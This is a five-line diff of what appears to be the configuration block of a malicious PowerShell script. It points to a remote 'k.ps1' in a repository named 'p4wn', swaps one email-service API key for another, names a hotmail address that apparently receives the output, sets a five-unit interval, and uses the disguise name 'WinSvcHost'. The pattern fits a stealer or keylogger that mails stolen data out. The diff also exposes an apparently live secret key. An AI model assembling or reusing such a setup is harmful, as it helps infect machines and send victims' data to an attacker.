@@ -1,5 +1,5 @@
 $u='https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1'
-$k='re_E5RqtiUa_DGW5Anr6waHxtoJ4Zexay5EB'
+$k='re_SC8bwXbU_3cyFBwPJsSnqbhUGK428oj44'
 $t='elgono_9@hotmail.com'
 $m=5
 $n='WinSvcHost'
